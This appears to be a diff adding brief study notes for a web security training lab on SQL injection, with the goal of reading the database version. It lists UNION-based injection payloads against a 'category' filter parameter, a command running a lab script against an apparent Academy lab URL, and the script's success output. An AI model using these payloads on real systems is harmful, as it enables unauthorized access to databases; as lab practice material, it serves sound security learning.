@@ -1,0 +1,15 @@
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+END GOAL: Get database version
+
+'order by 1# ctrl+u
+'order+by+2%23
+
+/filter?category=Pets'union+select+'dsfdsf','fvfs'%23
+
+'union+select+@@version,null%23
+
+python lab8.py "https://ac8b1ff01e621bf1805e79db003b00f3.web-security-academy.net"
+[+] SQL Injection successfull, number of column: 2
+[+]SQL Version successfull 
+[+] SQL Injection successfull, column with data type string: 1
